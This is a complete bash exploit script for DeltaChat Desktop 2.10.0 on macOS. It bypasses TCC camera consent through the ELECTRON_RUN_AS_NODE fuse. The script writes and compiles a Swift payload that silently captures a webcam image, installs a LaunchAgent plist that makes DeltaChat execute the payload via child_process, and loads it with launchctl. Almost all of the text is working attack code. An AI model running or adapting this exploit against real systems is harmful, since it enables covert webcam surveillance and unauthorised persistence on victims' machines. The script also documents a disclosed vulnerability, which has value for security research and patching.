#!/bin/bash

# Exploit Title: DeltaChat Desktop 2.10.0 - macOS TCC Bypass via RunAsNode fuse (camera access)
# Type: Local Privilege Escalation 
# Date: 2025-08-18
#
# Exploit Author: Kun Peeks - (@SwayZGl1tZyyy)
# Github: https://github.com/SwayZGl1tZyyy
#
# Vendor Homepage: https://delta.chat
# Software Link: https://github.com/deltachat/deltachat-desktop/releases/download/v2.10.0/DeltaChat-2.10.0-universal.dmg
# Version: v2.10.0
# Tested on: macOS Ventura
#
# Description:
# DeltaChat Desktop for macOS allows a local attacker to bypass TCC protections by abusing the ELECTRON_RUN_AS_NODE environment variable. 
# This enables execution of a Swift-based camera payload without user consent, leading to unauthorized access to the webcam. 
#
# Steps of exploitation:
# 1: Write Swift camera payload to /tmp/selfie_payload.swift
# 2: Compile Swift payload to /Users/user/Desktop/selfie
# 3: Create LaunchAgent plist at /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.camera.plist
# 4: Load LaunchAgent and trigger DeltaChat
# 5. Saving selfie at /tmp/selfie.jpg


set -e

USERNAME=$(whoami)
SWIFT_FILE="/tmp/selfie_payload.swift"
BIN_PATH="/Users/$USERNAME/Desktop/selfie"
PLIST_PATH="/Users/$USERNAME/Library/LaunchAgents/com.deltachat.tcc.camera.plist"

echo "[*] Step 1: Write Swift camera payload to $SWIFT_FILE"

cat <<EOF > "$SWIFT_FILE"
import Foundation
import AVFoundation
import AppKit
import CoreImage

class SelfieTaker: NSObject, AVCaptureVideoDataOutputSampleBufferDelegate {
    var session: AVCaptureSession?
    var queue: DispatchQueue?

    override init() {
        super.init()
        session = AVCaptureSession()
        queue = DispatchQueue.main

        do {
            guard let device = AVCaptureDevice.default(for: .video) else {
                print("[-] No video device found")
                return
            }
            let input = try AVCaptureDeviceInput(device: device)
            if session!.canAddInput(input) {
                session!.addInput(input)
            }

            let output = AVCaptureVideoDataOutput()
            output.setSampleBufferDelegate(self, queue: queue)
            if session!.canAddOutput(output) {
                session!.addOutput(output)
            }

            queue?.async {
                self.session!.startRunning()
            }
        } catch {
            print("[-] Error setting up camera: \\(error)")
        }
    }

    func captureOutput(_ output: AVCaptureOutput, didOutput sampleBuffer: CMSampleBuffer, from connection: AVCaptureConnection) {
        if let frame = CMSampleBufferGetImageBuffer(sampleBuffer) {
            let ciImage = CIImage(cvImageBuffer: frame)
            let context = CIContext()
            if let cgImage = context.createCGImage(ciImage, from: ciImage.extent) {
                let nsImage = NSImage(cgImage: cgImage, size: NSSize.zero)
                let bitmapRep = NSBitmapImageRep(data: nsImage.tiffRepresentation!)!
                let jpgData = bitmapRep.representation(using: .jpeg, properties: [:])!
                try? jpgData.write(to: URL(fileURLWithPath: "/tmp/selfie.jpg"))
                print("[+] Selfie saved at /tmp/selfie.jpg")
            }
        }
    }

    func stop() {
        session?.stopRunning()
    }
}

let taker = SelfieTaker()
DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
    taker.stop()
    exit(0)
}
RunLoop.main.run()
EOF

echo "[*] Step 2: Compile Swift payload to $BIN_PATH"
swiftc "$SWIFT_FILE" -o "$BIN_PATH"
chmod +x "$BIN_PATH"

echo "[*] Step 3: Create LaunchAgent plist at $PLIST_PATH"

mkdir -p "/Users/$USERNAME/Library/LaunchAgents"

cat <<EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.deltachat.tcc.camera</string>
  <key>ProgramArguments</key>
  <array>
    <string>/Applications/DeltaChat.app/Contents/MacOS/DeltaChat</string>
    <string>-e</string>
    <string>require('child_process').exec('/Users/$USERNAME/Desktop/selfie')</string>
  </array>
  <key>EnvironmentVariables</key>
  <dict>
    <key>ELECTRON_RUN_AS_NODE</key>
    <string>true</string>
  </dict>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
EOF

echo "[*] Step 4: Load LaunchAgent and trigger DeltaChat"
launchctl unload "$PLIST_PATH" 2>/dev/null || true
launchctl load "$PLIST_PATH"

echo "[*] Waiting 5 seconds for selfie to complete..."
sleep 5

echo "[*] Checking selfie result:"
if [ -f "/tmp/selfie.jpg" ]; then
    echo "[+] Selfie saved at /tmp/selfie.jpg"
    open /tmp/selfie.jpg
else
    echo "[-] No selfie found. Check if DeltaChat has camera permissions."
fi
